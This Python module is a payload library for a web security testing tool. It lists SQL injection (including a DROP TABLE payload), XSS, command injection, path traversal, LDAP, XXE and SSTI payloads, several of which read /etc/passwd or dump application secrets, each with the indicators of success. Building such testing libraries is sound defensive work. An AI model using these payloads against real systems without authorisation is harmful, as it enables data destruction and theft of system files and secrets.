"""
Payload Library
Comprehensive library of attack payloads for security testing.

Author: Marc Arévalo
Version: 1.0
"""

import logging
from dataclasses import dataclass
from typing import Dict, List, Optional

logger = logging.getLogger(__name__)


@dataclass
class Payload:
    """Represents a security test payload."""

    value: str
    name: str
    description: str
    category: str
    expected_indicators: List[str]


class PayloadLibrary:
    """
    Library of attack payloads for various vulnerability types.

    Provides payloads for:
    - SQL Injection
    - XSS (Cross-Site Scripting)
    - Command Injection
    - Path Traversal
    - LDAP Injection
    - XML Injection
    - SSTI (Server-Side Template Injection)
    """

    def __init__(self):
        """Initialize payload library."""
        self._payloads = self._load_payloads()

    def _load_payloads(self) -> Dict[str, List[Payload]]:
        """Load all payloads."""
        return {
            "sql_injection": self._get_sql_injection_payloads(),
            "xss": self._get_xss_payloads(),
            "command_injection": self._get_command_injection_payloads(),
            "path_traversal": self._get_path_traversal_payloads(),
            "ldap_injection": self._get_ldap_injection_payloads(),
            "xml_injection": self._get_xml_injection_payloads(),
            "ssti": self._get_ssti_payloads(),
        }

    def _get_sql_injection_payloads(self) -> List[Payload]:
        """Get SQL injection payloads."""
        return [
            Payload(
                value="' OR '1'='1",
                name="Classic SQL Injection",
                description="Authentication bypass using OR condition",
                category="sql_injection",
                expected_indicators=[
                    "sql",
                    "syntax",
                    "error",
                    "mysql",
                    "postgres",
                    "oracle",
                    "database",
                ],
            ),
            Payload(
                value="' OR 1=1--",
                name="SQL Comment Bypass",
                description="Authentication bypass with comment",
                category="sql_injection",
                expected_indicators=["sql", "syntax", "error", "unexpected"],
            ),
            Payload(
                value="admin'--",
                name="Admin Comment",
                description="Login as admin with comment",
                category="sql_injection",
                expected_indicators=["sql", "syntax", "error"],
            ),
            Payload(
                value="' UNION SELECT NULL, NULL--",
                name="UNION-based SQL Injection",
                description="Extract data using UNION",
                category="sql_injection",
                expected_indicators=["union", "sql", "syntax", "error"],
            ),
            Payload(
                value="'; DROP TABLE users--",
                name="Destructive SQL Injection",
                description="Attempt to drop table (dangerous!)",
                category="sql_injection",
                expected_indicators=["drop", "delete", "sql", "error"],
            ),
            Payload(
                value="' AND 1=(SELECT COUNT(*) FROM users)--",
                name="Blind SQL Injection",
                description="Boolean-based blind SQLi",
                category="sql_injection",
                expected_indicators=["timeout", "delay", "different response"],
            ),
        ]

    def _get_xss_payloads(self) -> List[Payload]:
        """Get XSS payloads."""
        return [
            Payload(
                value="<script>alert('XSS')</script>",
                name="Basic XSS",
                description="Simple script injection",
                category="xss",
                expected_indicators=["<script>", "alert", "XSS"],
            ),
            Payload(
                value="<img src=x onerror=\"alert('XSS')\">",
                name="Image XSS",
                description="XSS via image tag",
                category="xss",
                expected_indicators=["<img", "onerror", "alert"],
            ),
            Payload(
                value='"><script>alert(String.fromCharCode(88,83,83))</script>',
                name="Encoded XSS",
                description="XSS with character encoding",
                category="xss",
                expected_indicators=["<script>", "fromCharCode"],
            ),
            Payload(
                value="javascript:alert('XSS')",
                name="JavaScript Protocol XSS",
                description="XSS via javascript: protocol",
                category="xss",
                expected_indicators=["javascript:", "alert"],
            ),
            Payload(
                value="<iframe src=\"javascript:alert('XSS')\"></iframe>",
                name="IFrame XSS",
                description="XSS via iframe",
                category="xss",
                expected_indicators=["<iframe", "javascript:", "alert"],
            ),
        ]

    def _get_command_injection_payloads(self) -> List[Payload]:
        """Get command injection payloads."""
        return [
            Payload(
                value="; ls -la",
                name="Command Chaining",
                description="Chain commands with semicolon",
                category="command_injection",
                expected_indicators=[
                    "root",
                    "bin",
                    "etc",
                    "command",
                    "not found",
                ],
            ),
            Payload(
                value="| cat /etc/passwd",
                name="Pipe Command Injection",
                description="Inject command via pipe",
                category="command_injection",
                expected_indicators=["root:x:", "daemon:", "/bin/", "passwd"],
            ),
            Payload(
                value="&& whoami",
                name="AND Command Injection",
                description="Inject command with AND operator",
                category="command_injection",
                expected_indicators=["www-data", "apache", "root", "user"],
            ),
            Payload(
                value="`whoami`",
                name="Backtick Command Injection",
                description="Command substitution",
                category="command_injection",
                expected_indicators=["www-data", "apache", "root"],
            ),
        ]

    def _get_path_traversal_payloads(self) -> List[Payload]:
        """Get path traversal payloads."""
        return [
            Payload(
                value="../../../etc/passwd",
                name="Linux Path Traversal",
                description="Access /etc/passwd file",
                category="path_traversal",
                expected_indicators=["root:x:", "daemon:", "/bin/"],
            ),
            Payload(
                value="..\\..\\..\\windows\\win.ini",
                name="Windows Path Traversal",
                description="Access win.ini file",
                category="path_traversal",
                expected_indicators=["[fonts]", "[extensions]", "win.ini"],
            ),
            Payload(
                value="....//....//....//etc/passwd",
                name="Encoded Path Traversal",
                description="Bypass filters with encoding",
                category="path_traversal",
                expected_indicators=["root:x:", "forbidden", "not found"],
            ),
        ]

    def _get_ldap_injection_payloads(self) -> List[Payload]:
        """Get LDAP injection payloads."""
        return [
            Payload(
                value="*)(uid=*))(|(uid=*",
                name="LDAP Wildcard Injection",
                description="Bypass LDAP authentication",
                category="ldap_injection",
                expected_indicators=["ldap", "directory", "invalid"],
            ),
            Payload(
                value="admin*)(&(objectClass=*",
                name="LDAP Filter Injection",
                description="Inject LDAP filter",
                category="ldap_injection",
                expected_indicators=["ldap", "syntax", "error"],
            ),
        ]

    def _get_xml_injection_payloads(self) -> List[Payload]:
        """Get XML injection payloads."""
        return [
            Payload(
                value='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                name="XXE (XML External Entity)",
                description="Read local files via XXE",
                category="xml_injection",
                expected_indicators=["root:x:", "daemon:", "entity", "xml"],
            ),
            Payload(
                value='<?xml version="1.0"?><user><name>test</name><role>admin</role></user>',
                name="XML Injection",
                description="Inject XML to escalate privileges",
                category="xml_injection",
                expected_indicators=["admin", "privilege", "unauthorized"],
            ),
        ]

    def _get_ssti_payloads(self) -> List[Payload]:
        """Get Server-Side Template Injection payloads."""
        return [
            Payload(
                value="{{7*7}}",
                name="Basic SSTI",
                description="Test template evaluation",
                category="ssti",
                expected_indicators=["49", "template", "error"],
            ),
            Payload(
                value="${7*7}",
                name="JSP/EL SSTI",
                description="Test JSP Expression Language",
                category="ssti",
                expected_indicators=["49", "expression", "error"],
            ),
            Payload(
                value="{{config.items()}}",
                name="Flask/Jinja2 SSTI",
                description="Dump Flask configuration",
                category="ssti",
                expected_indicators=["SECRET_KEY", "DEBUG", "config"],
            ),
        ]

    def get_payloads(self, category: str) -> List[Payload]:
        """
        Get payloads for specific category.

        Args:
            category: Vulnerability category

        Returns:
            List of payloads
        """
        return self._payloads.get(category, [])

    def get_all_categories(self) -> List[str]:
        """
        Get all available payload categories.

        Returns:
            List of category names
        """
        return list(self._payloads.keys())

    def get_payload_count(self, category: Optional[str] = None) -> int:
        """
        Get number of payloads.

        Args:
            category: Optional category filter

        Returns:
            Payload count
        """
        if category:
            return len(self._payloads.get(category, []))
        return sum(len(payloads) for payloads in self._payloads.values())
